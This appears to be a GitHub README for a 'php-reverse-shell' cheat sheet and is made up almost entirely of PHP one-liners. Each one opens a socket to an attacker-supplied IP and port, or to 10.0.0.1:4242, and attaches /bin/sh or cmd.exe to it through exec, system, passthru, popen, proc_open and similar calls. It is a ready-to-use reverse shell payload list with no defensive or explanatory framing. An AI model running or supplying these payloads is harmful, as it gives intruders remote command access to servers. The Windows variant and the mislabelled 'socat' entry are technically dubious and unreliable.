# php-reverse-shell



![image](https://user-images.githubusercontent.com/79219451/116995519-03dc4480-ac8f-11eb-9331-d247ecb58d44.png)





**PHP**
```
php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("IP",PORT);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("IP",PORT);`/bin/sh -i <&3 >&3 2>&3`;'
php -r '$sock=fsockopen("IP",PORT);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("IP",PORT);passthru("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("IP",PORT);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
```

**windows**
```
php -r '$sock=fsockopen("IP",PORT);exec("C:\Windows\system32\cmd.exe -i <&3 >&3 2>&3");'
```

**socat**
```
php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```
